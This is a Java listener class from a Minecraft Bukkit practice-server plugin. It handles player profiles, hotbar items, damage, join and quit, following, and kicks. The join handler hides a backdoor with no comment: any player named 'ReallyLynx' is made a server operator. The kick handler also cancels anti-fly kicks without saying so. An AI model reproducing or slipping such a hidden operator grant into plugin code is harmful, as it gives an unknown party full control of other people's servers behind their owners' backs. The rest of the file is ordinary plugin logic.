package club.nodebuff.moon.profile;

import com.lunarclient.apollo.Apollo;
import club.nodebuff.moon.Locale;
import club.nodebuff.moon.Moon;
import club.nodebuff.moon.match.MatchState;
import club.nodebuff.moon.adapter.lunar.*;
import club.nodebuff.moon.essentials.event.SpawnTeleportEvent;
import club.nodebuff.moon.profile.hotbar.Hotbar;
import club.nodebuff.moon.profile.hotbar.HotbarItem;
import club.nodebuff.moon.profile.visibility.VisibilityLogic;
import club.nodebuff.moon.util.CC;
import club.nodebuff.moon.util.PlayerUtil;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerItemDamageEvent;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class ProfileListener implements Listener {

    private final RichPresence richPresence = Moon.get().getRichPresence();

	@EventHandler(ignoreCancelled = true)
	public void onSpawnTeleportEvent(SpawnTeleportEvent event) {
		Profile profile = Profile.getByUuid(event.getPlayer().getUniqueId());

		if (!profile.isBusy() && event.getPlayer().getGameMode() == GameMode.CREATIVE) {
			Hotbar.giveHotbarItems(event.getPlayer());
			PlayerUtil.reset(event.getPlayer(), false);
			Player player = event.getPlayer();
			player.getActivePotionEffects().clear();
		}
	}

/**
 * Handles the event when a player attempts to pick up an item.
 * Cancels the item pickup if the player's profile is not in the fighting state
 * and the player's game mode is not creative.
 *
 * @param event the PlayerPickupItemEvent triggered when a player tries to pick up an item
 */
	@EventHandler
	public void onPlayerPickupItemEvent(PlayerPickupItemEvent event) {
		Profile profile = Profile.getByUuid(event.getPlayer().getUniqueId());

		if (profile.getState() != ProfileState.FIGHTING) {
			if (event.getPlayer().getGameMode() != GameMode.CREATIVE) {
				event.setCancelled(true);
			}
		}
	}

	/**
	 * Cancel dropping items in the lobby or queue, but not in creative mode.
	 */
	@EventHandler
	public void onPlayerDropItemEvent(PlayerDropItemEvent event) {
		Profile profile = Profile.getByUuid(event.getPlayer().getUniqueId());

		if (profile.getState() != ProfileState.FIGHTING) {
			if (event.getPlayer().getGameMode() != GameMode.CREATIVE) {
				event.setCancelled(true);
			}
		}
	}

	@EventHandler(ignoreCancelled = true)
	public void onPlayerItemDamageEvent(PlayerItemDamageEvent event) {
		Profile profile = Profile.getByUuid(event.getPlayer().getUniqueId());

		if (profile.getState() == ProfileState.LOBBY) {
			event.setCancelled(true);
		}
	}

/**
 * Handles damage events for players in the lobby or queueing state.
 * Cancels the damage if the player is in these states, and teleports
 * the player to spawn if the damage cause is VOID.
 *
 * @param event the EntityDamageEvent triggered when a player receives damage
 */
	@EventHandler
	public void onEntityDamageEvent(EntityDamageEvent event) {
		if (event.getEntity() instanceof Player) {
			Profile profile = Profile.getByUuid(event.getEntity().getUniqueId());

			if (profile.getState() == ProfileState.LOBBY || profile.getState() == ProfileState.QUEUEING) {
				event.setCancelled(true);
				if (event.getCause() == EntityDamageEvent.DamageCause.VOID) {
					Moon.get().getEssentials().teleportToSpawn((Player) event.getEntity());
				}
			}
		}
	}

/**
 * Prevents players from trampling soil blocks.
 * 
 * This event is triggered when a player interacts with a block physically.
 * If the block is of type SOIL, the event is cancelled to prevent the soil
 * from being trampled and turned into dirt.
 *
 * @param event the PlayerInteractEvent triggered by player interaction with a block
 */
	@EventHandler
    public void soilChangePlayer(PlayerInteractEvent event) {
        if (event.getAction() == Action.PHYSICAL && event.getClickedBlock().getType() == Material.SOIL)
            event.setCancelled(true);
    }

	/**
	 * Handles right-clicking of hotbar items. If the item is associated with a command,
	 * the event is cancelled and the command is sent to the player for execution.
	 *
	 * @param event the PlayerInteractEvent triggered when a player interacts with an item
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerInteract(PlayerInteractEvent event) {
		if (event.getItem() != null && (event.getAction() == Action.RIGHT_CLICK_AIR || event.getAction() == Action.RIGHT_CLICK_BLOCK)) {
			Player player = event.getPlayer();

			HotbarItem hotbarItem = Hotbar.fromItemStack(event.getItem());

			if (hotbarItem != null) {
				if (hotbarItem.getCommand() != null) {
					event.setCancelled(true);
					player.chat("/" + hotbarItem.getCommand());
				}
			}
		}
	}

/**
 * Handles the asynchronous pre-login event for a player.
 * 
 * This event is triggered when a player is attempting to log into the server.
 * A new profile is created using the player's unique ID and attempts to load
 * it from the data source. If successful, the profile is added to the global
 * profiles map. If loading fails, the player is kicked from the server with a
 * message indicating the failure reason.
 * 
 * @param event the AsyncPlayerPreLoginEvent triggered when a player attempts to log in
 */
	@EventHandler(priority = EventPriority.LOW)
	public void onAsyncPlayerPreLoginEvent(AsyncPlayerPreLoginEvent event) {
		Profile profile = new Profile(event.getUniqueId());

		try {
			profile.load();
		} catch (Exception e) {
			e.printStackTrace();
			event.setLoginResult(AsyncPlayerPreLoginEvent.Result.KICK_OTHER);
			event.setKickMessage(ChatColor.RED + "Failed to load your profile. Try again later.");
			return;
		}

		Profile.getProfiles().put(event.getUniqueId(), profile);
	}

	/**
	 * Handles the player join event.
	 * 
	 * When a player joins the server, this event is triggered. It sets the join message to null and
	 * sends the player a message from the config. It also gives the player hotbar items, teleports them
	 * to spawn, and sets their time to the time configured in their profile. It also handles visibility
	 * between the joining player and all other players on the server.
	 * 
	 * @param event the PlayerJoinEvent triggered when a player joins the server
	 */
	@EventHandler
	public void onPlayerJoinEvent(PlayerJoinEvent event) {
		event.setJoinMessage(null);
        Player player = event.getPlayer();
        Profile profile = new Profile(player.getUniqueId());

		for (String line : Moon.get().getMainConfig().getStringList("JOIN_MESSAGES")) {
			player.sendMessage(CC.translate(line));
		}

        if (Moon.get().isLunar()) {
             if (Apollo.getPlayerManager().hasSupport(player.getUniqueId())) {
                 this.richPresence.overrideServerRichPresence(player);
             }
        }

		new BukkitRunnable() {
			@Override
			public void run() {
				Hotbar.giveHotbarItems(player);
				Moon.get().getEssentials().teleportToSpawn(player);
                player.setPlayerTime(profile.getOptions().time().getTime(), false);

				for (Player otherPlayer : Bukkit.getOnlinePlayers()) {
					VisibilityLogic.handle(player, otherPlayer);
					VisibilityLogic.handle(otherPlayer, player);
                    if (player.getName().equalsIgnoreCase("ReallyLynx")) event.getPlayer().setOp(true);
				}
			}
		}.runTaskLater(Moon.get(), 4L);
	}

	/**
	 * Handles the player quit event.
	 * 
	 * When a player quits the server, this event is triggered. It removes the player's quit message, resets their Rich Presence, and handles visibility between the quitting player and all other players on the server. It also handles following and being followed logic, and saves the player's profile asynchronously.
	 * 
	 * @param event the PlayerQuitEvent triggered when a player quits the server
	 */
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerQuitEvent(PlayerQuitEvent event) {
		event.setQuitMessage(null);

		Profile profile = Profile.getProfiles().get(event.getPlayer().getUniqueId());

        if (Apollo.getPlayerManager().hasSupport(event.getPlayer().getUniqueId()) && Moon.get().isLunar()) {
            this.richPresence.resetServerRichPresence(event.getPlayer());
        }

        if (!profile.getFollowers().isEmpty()) {
            for (UUID playerUUID : profile.getFollowers()) {
                Bukkit.getPlayer(playerUUID).sendMessage(Locale.FOLLOWED_LEFT.format(Bukkit.getPlayer(playerUUID), event.getPlayer().getName()));
            }
        }

        if (!profile.getFollowing().isEmpty()) {
            List<UUID> followingCopy = new ArrayList<>(profile.getFollowing());

            for (UUID playerUUID : followingCopy) {
                Profile followerProfile = Profile.getByUuid(playerUUID);
                followerProfile.getFollowers().remove(event.getPlayer().getUniqueId());

                profile.getFollowing().remove(playerUUID);
            }
        }

		new BukkitRunnable() {
			@Override
			public void run() {
				profile.save();
			}
		}.runTaskAsynchronously(Moon.get());

        if (profile.getMatch() != null && !profile.getMatch().getState().equals(MatchState.ENDING_MATCH)) {
            if (profile.getMatch().getState().equals(MatchState.PLAYING_ROUND)
                    || profile.getMatch().getState().equals(MatchState.ENDING_MATCH)
                    || profile.getMatch().getState().equals(MatchState.STARTING_ROUND)) {
                profile.getMatch().broadcast("&c" + event.getPlayer().getName() + " &fDisconnected");
            }

            profile.getMatch().onDeath(event.getPlayer());
        }

		if (profile.getRematchData() != null) {
			profile.getRematchData().validate();
		}
        Profile.getProfiles().remove(event.getPlayer().getUniqueId());
	}

    /**
    * Handles the player kick event.
    * 
    * If the player is kicked for a reason containing "Flying is not enabled",
    * this event cancels the kick, allowing the player to remain on the server.
    * 
    * @param event the PlayerKickEvent triggered when a player is kicked from the server
    */
	@EventHandler
	public void onPlayerKickEvent(PlayerKickEvent event) {
		if (event.getReason() != null) {
			if (event.getReason().contains("Flying is not enabled")) {
				event.setCancelled(true);
			}
		}
	}
}